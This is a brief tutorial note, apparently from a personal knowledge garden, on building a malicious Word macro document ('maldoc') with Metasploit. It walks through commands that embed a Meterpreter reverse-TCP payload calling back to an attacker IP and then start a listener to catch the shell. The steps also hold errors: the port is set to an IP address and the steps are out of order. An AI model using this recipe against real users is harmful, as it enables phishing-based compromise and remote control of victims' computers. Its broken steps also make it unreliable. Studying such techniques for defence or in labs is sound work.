---
{"dg-publish":true,"permalink":"/zzzz/creating-ms-word-with-macros/"}
---

[[]]
#### Introduction
---
**For educational purposes only.**

The top way to 'hack' a company even with high-end security tools is often through exploiting the weakest link: the users, One of the common techniques is the use of Maldocs short for malicious documents combine with tricking the user into opening the malicious document goes under social engineering.
# Creating the MalDocs

1. `msfconsole` on terminal.
2. `set payload windows/meterpreter/reverse_tcp`
3. `use exploit/multi/fileformat/office_word_macro` - creating document with macro.
4. `set LHOST 10.10.139.139` - attacker's IP address.
5. `set LPORT 8.8.8.8` - specifies port number where the attacker would listen to.
6. `run`

![Pasted image 20241211184218.png](/img/user/x/images/Pasted%20image%2020241211184218.png)
#### Creating a listener (varies from OS)
---

7. `use multi/handler` - creating a listener
8. `set payload windows/meterpreter/reverse_tcp`
9. `set LHOST <IP>`
10. `set LPORT <PORT>`


